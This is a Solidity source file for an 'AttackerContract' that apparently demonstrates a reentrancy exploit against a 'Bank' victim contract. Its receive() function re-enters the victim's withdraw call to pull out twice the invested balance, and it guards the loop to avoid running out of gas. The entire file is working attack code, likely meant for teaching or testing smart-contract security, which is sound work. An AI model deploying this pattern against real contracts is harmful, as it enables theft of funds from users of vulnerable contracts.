// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
import './VictimContract.sol';

contract AttackerContract {
  Bank public victim;
  uint256 abort;

  function donate() external payable {}

  function attack(Bank addr) public payable {
    victim = addr;
    abort = 0;
    victim.withdraw(victim.getBalance(address(this)));
  }

  function withdraw(Bank addr) public {
    addr.withdraw(addr.getBalance(address(this)));
  }

  receive() external payable {
    if (abort == 0) {
      abort = 1; // abort after second re-entrancy to avoid out-of-gas
      // withdraw a second time, s.t. we withdraw 2x the balance we
      // invested into the victim Bank contract.
      victim.withdraw(victim.getBalance(address(this)));
    }
  }
}
